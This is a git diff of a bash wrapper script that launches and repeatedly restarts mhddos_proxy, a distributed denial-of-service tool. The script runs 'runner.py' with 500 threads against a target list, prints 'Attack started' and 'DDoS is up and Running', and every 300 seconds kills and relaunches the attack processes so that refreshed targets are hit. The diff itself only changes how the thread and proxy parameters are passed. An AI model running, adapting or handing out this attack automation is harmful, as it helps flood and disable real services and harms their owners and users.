@@ -19,12 +19,12 @@ num_of_copies="${1:-1}"
 restart_interval="300"
 
 #parameters that passed to python scrypt
-threads="${2:-500}"
-threads="-t $threads"
-rpc="${3:-2000}"
-rpc="--rpc $rpc"
-proxy_interval="1200"
-proxy_interval="-p $proxy_interval"
+#threads="${2:-500}"
+#threads="-t $threads"
+#rpc="${3:-2000}"
+#rpc="--rpc $rpc"
+#proxy_interval="1200"
+#proxy_interval="-p $proxy_interval"
 
 #Just in case kill previous copy of mhddos_proxy
 pkill -f runner.py
@@ -63,15 +63,14 @@ do
             #echo $cmd_line
             #echo $cmd_line $proxy_interval $threads $rpc
             cd ~/mhddos_proxy
-            python3 runner.py --table $cmd_line $threads ##$proxy_interval $rpc&    ##$threads
+            python3 runner.py $cmd_line -t 500 --table ##$proxy_interval $rpc&    ##$threads
             echo -e "Attack started. Wait a few minutes for output"
    done
-   
-   echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
-   sleep $restart_interval
-   clear
-   echo -e "\nRESTARTING\nKilling old processes..."
-   pkill -f runner.py
-   pkill -f ./start.py
-   echo -e "\nOld processes have been killed - starting new ones"
+echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
+sleep $restart_interval
+clear
+ echo -e "\nRESTARTING\nKilling old processes..."
+ pkill -f runner.py
+ pkill -f ./start.py
+ echo -e "\nOld processes have been killed - starting new ones"
 done
